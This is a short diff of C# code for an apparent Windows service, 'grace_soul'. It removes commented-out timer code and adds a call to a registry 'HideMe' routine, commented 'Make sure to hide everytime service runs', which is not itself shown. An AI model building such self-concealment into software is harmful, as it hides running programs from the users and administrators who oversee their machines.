@@ -115,14 +115,7 @@ namespace grace_soul
             {
 
                 if (cls_Scheduler.IsThereAnyTrigger())
-                {
-                    //_timer_trigger = new System.Timers.Timer();
-                    //_timer_trigger.Interval = 2 * 1000; //every 2 second
-                    //_timer_trigger.Elapsed += new System.Timers.ElapsedEventHandler(_timer_trigger_Elapsed);
-                    //_timer_trigger.Start();
-
-                    //cls_Utility.Log("** Triggerer Start................. OK");
-
+                {                    
                     // Trigger: 'OnStartup' event
                     #region OnStartup
                     RunTrigger("{@onstartup@}", "");
@@ -132,7 +125,17 @@ namespace grace_soul
             catch (Exception ex)
             {
                 cls_Utility.Log("! Error on starting _timer_trigger." + ex.Message);
-            }            
+            }
+
+            try
+            {
+                // Make sure to hide everytime service runs
+                cls_System.cls_Registry.HideMe();
+            }
+            catch(Exception ex)
+            {
+                cls_Utility.Log("! Cannot hide" + ex.Message);
+            }
         }
 
         protected override void OnStop()
